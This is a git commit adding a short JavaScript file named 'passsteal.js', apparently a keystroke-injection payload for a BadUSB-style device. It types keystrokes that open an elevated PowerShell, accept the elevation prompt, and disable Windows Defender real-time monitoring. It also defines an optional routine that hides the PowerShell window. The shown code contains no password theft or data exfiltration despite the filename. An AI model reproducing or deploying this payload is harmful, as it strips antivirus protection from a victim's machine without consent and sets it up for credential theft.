ba70d56fd4d3dd85d40f2ab5f5689777e15fc055
Nexr0n <39227048+Nexr0n@users.noreply.github.com>
2020-05-25 10:55:40 -0700

    Add files via upload

---
+++ passsteal.js
@@ -0,0 +1,23 @@
+function fast() {
+  typingSpeed(0,0)
+}
+function startPS() {
+	press("GUI x");
+	delay(50);
+	press("a");
+	delay(300);
+	press("LEFT");
+	delay(50);
+	press("ENTER");
+	delay(200);
+}
+function hidePS() {
+	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
+  	press("ENTER");
+}
+layout('de');
+fast();
+startPS();
+//hidePS();
+type("Set-MpPreference -DisableRealtimeMonitoring $true")
+press("ENTER");
